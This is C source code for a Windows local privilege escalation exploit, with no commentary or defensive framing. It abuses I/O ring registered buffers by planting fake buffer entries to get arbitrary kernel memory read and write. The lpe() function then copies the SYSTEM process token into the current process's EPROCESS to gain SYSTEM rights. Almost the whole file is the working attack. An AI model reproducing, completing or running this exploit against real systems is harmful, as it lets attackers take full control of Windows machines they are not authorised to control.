#include "ioring.h"
#include "init.h"
#include <ioringapi.h>
#include <stdio.h>

HIORING hIoRing = NULL;
DWORD64 ioRingObject = NULL;
HANDLE hInPipe = INVALID_HANDLE_VALUE;
HANDLE hOutPipe = INVALID_HANDLE_VALUE;
HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;

DWORD64 ioSetup() {
    DWORD ret = -1;
    IORING_CREATE_FLAGS ioRingFlags;
    memset(&ioRingFlags, 0, sizeof(IORING_CREATE_FLAGS));

    ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    ioRingFlags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

    ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);

    if (ret != S_OK) {
        return -1;
    }

    hInPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    hOutPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe))
        return -1;

    hInPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient))
        return -1;

    ioRingObject = getObjAddr(*(PHANDLE)hIoRing, GetCurrentProcessId());
    return ioRingObject;
}

int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = (PVOID)pReadAddr;
    pMcBufferEntry->Length = ulReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = (ULONG64)pMcBufferEntry;

    ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen, ULONG index)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(index, 0);
    IORING_CQE cqe = { 0 };

    if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = (PVOID)pWriteAddr;
    pMcBufferEntry->Length = ulWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[index] = (ULONG64)pMcBufferEntry;

    ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

DWORD lpe(DWORD64 regBuffer, DWORD64 regBufferCount) {
    DWORD64 pFakeRegBuffer = (DWORD64)VirtualAlloc((LPVOID)regBuffer, sizeof(ULONG64) * regBufferCount, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (pFakeRegBuffer != regBuffer) {
        puts("[-] VirtualAlloc failed, abort.");
        exit(-1);
    }

    memset((void*)pFakeRegBuffer, 0, sizeof(ULONG64) * regBufferCount);

    DWORD64 targetEPROCESS = getObjAddr(OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId()), GetCurrentProcessId());

    if (targetEPROCESS == -1) {
        puts("[-] Get current EPROCESS failed, abort.");
        exit(-1);
    }
    printf("[+] Target pid: %llx\n", targetEPROCESS);

    DWORD64 privilegedEPROCESS = getObjAddr((HANDLE)4, 4);

    if (privilegedEPROCESS == -1) {
        puts("[-] Get current EPROCESS failed, abort.");
        exit(-1);
    }
    printf("[+] PID 4: %llx\n", privilegedEPROCESS);

    _HIORING* pHIoRing = *(_HIORING**)&hIoRing;
    pHIoRing->RegBufferArray = (PVOID)pFakeRegBuffer;
    pHIoRing->BufferArraySize = regBufferCount;

    DWORD64 sysToken = 0;
    DWORD ret = ioring_read((PULONG64)pFakeRegBuffer, privilegedEPROCESS + EPROC_TOKEN_OFFSET, &sysToken, sizeof(ULONG64));
    if (ret != 0) {
        puts("[-] ioring_read failed, abort.");
        exit(-1);
    }
    printf("[+] System token: %llx\n", sysToken);

    ret = ioring_write((PULONG64)pFakeRegBuffer, targetEPROCESS + EPROC_TOKEN_OFFSET, &sysToken, sizeof(ULONG64), 1);
    if (ret != 0) {
        puts("[-] ioring_write failed, abort.");
        exit(-1);
    }

    char null[0x10] = { 0 };
    ioring_write((PULONG64)pFakeRegBuffer, ioRingObject + 0xb0, &null, 0x10, 0);

    getchar();
    return 1;
}